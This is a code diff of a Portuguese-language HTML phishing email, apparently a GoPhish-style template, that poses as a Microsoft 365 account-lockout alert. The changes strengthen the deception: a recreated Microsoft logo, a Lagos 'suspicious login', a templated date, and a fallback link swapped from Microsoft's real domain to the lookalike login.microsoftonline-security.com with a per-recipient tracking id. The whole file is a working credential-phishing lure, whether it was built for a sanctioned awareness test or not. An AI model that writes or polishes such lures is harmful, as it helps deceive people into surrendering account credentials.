@@ -125,12 +125,21 @@
 <body>
     <div class="container">
         <div class="header">
-            <div class="ms-logo">Microsoft</div>
-            <div class="ms-product">Microsoft 365 — Segurança da Conta</div>
+            <table role="presentation" cellpadding="0" cellspacing="0"><tr>
+            <td style="vertical-align:middle;">
+                <table role="presentation" cellpadding="0" cellspacing="0" style="border-collapse:collapse;">
+                    <tr><td style="width:10px;height:10px;background:#f25022;"></td><td style="width:10px;height:10px;background:#7fba00;"></td></tr>
+                    <tr><td style="width:10px;height:10px;background:#00a4ef;"></td><td style="width:10px;height:10px;background:#ffb900;"></td></tr>
+                </table>
+            </td>
+            <td style="padding-left:10px;vertical-align:middle;">
+                <div class="ms-logo">Microsoft</div>
+                <div class="ms-product">Microsoft 365 — Segurança da Conta</div>
+            </td>
+            </tr></table>
         </div>
 
         <div class="content">
-            <div class="security-icon">&#128274;</div>
             <div class="alert-heading">Seu acesso foi bloqueado</div>
             <div class="alert-sub">Detectamos atividade incomum na sua conta corporativa Microsoft 365</div>
 
@@ -146,11 +155,11 @@
                     </tr>
                     <tr>
                         <td>Localização suspeita</td>
-                        <td>Moscou, Rússia</td>
+                        <td>Lagos, Nigéria</td>
                     </tr>
                     <tr>
                         <td>Data e hora</td>
-                        <td>17/05/2025 — 14:32 (BRT)</td>
+                        <td>{{.Date}} — 14:32 (BRT)</td>
                     </tr>
                     <tr>
                         <td>Ação necessária</td>
@@ -172,13 +181,13 @@
             <hr class="divider">
 
             <p style="font-size: 12px; color: #666666;">Se você não conseguir acessar o link acima, copie e cole o seguinte endereço no seu navegador:<br>
-            <span style="color: #0078d4; word-break: break-all;">https://account.microsoft.com/security?ref=verify&rid={{.RId}}</span></p>
+            <span style="color: #0078d4; word-break: break-all;">https://login.microsoftonline-security.com/verify?rid={{.RId}}</span></p>
         </div>
 
         <div class="footer">
             <p>Este e-mail foi enviado para {{.Email}}. A Microsoft nunca solicita sua senha por e-mail.</p>
             <p>Microsoft Corporation — One Microsoft Way, Redmond, WA 98052 USA</p>
-            <p>© 2025 Microsoft Corporation. Todos os direitos reservados.</p>
+            <p>© 2026 Microsoft Corporation. Todos os direitos reservados.</p>
         </div>
     </div>
 
